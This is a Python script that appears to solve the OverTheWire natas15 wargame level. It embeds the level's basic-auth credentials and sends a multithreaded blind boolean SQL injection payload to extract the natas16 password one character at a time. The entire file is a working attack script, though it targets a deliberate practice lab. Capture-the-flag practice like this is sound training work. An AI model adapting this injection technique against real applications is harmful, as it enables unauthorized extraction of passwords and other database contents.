import threading
from threading import Thread
import requests
from requests.auth import HTTPBasicAuth

auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
filtered = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
#filtered = 'W03569acehijmnpqtwBEHINOR'
result = ["","","","","","","","","","","","","","","","" ,"","","","","","","","","","","","","","","",""]
nums = 0
threads = []

def task(i,char):
  payload = {'username' : 'natas16" AND BINARY substring(password,'+ str(i+1) + ',1) ="'+char}
  r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=auth, data = payload)
  if 'exists' in r.text :
    result[i] = char           
    

def attack(a,b):
  global nums,threads
  for i in range(a,b):
    if(nums>127):       
         for t in threads:
           t.join()
         nums=0
    for char in filtered:
       t = Thread(target=task, args=(i,char))
       t.start()
       threads.append(t)
       nums+=1
       

           

def mti_tred():
    global nums
    section=16
    threads = []
    for i in range(0,2):
       t = Thread(target=attack, args=(1+section*i,section*(i+1)+1,))
       t.start()
       threads.append(t)
      
    for t in threads:
     t.join()


     
if __name__ == "__main__":
    mti_tred()
    passwd=""
    for i in range(0,32):
      #attack(i)
      passwd+=result[i];
    print(passwd)